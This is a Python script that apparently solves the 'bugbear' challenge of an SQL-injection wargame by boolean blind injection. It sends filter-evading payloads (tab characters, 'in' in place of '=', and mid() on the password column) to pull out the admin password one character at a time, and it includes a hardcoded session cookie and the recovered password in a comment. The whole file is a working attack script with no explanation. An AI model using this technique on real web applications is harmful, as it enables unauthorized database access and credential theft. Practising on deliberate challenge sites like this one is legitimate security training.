import requests


def blindi():
	password=""
	cookies={"PHPSESSID":"2jmdje149iheon8es94327lllt"}
	for i in range(1,9):
		print("progress : " + str(i))
		for guess in range(48,127):
			print("matching with : " + chr(guess))
			URL='https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?no=-1%09%7c%7cid%09in("admin")%09%26%26%09mid(pw,'+str(i)+',1)%09in%09("'+chr(guess)+'")'
			response = requests.get(URL, cookies=cookies)
			if "Hello admin" in response.text:
				print(str(i)+" number's password : " + chr(guess))
				password+=chr(guess)
				break
			if guess == 126:
				password+=" "

	print("admin's Password : " + password)



if __name__ == "__main__":
	print("Start Program")
	blindi()
	# password : 52dc3991
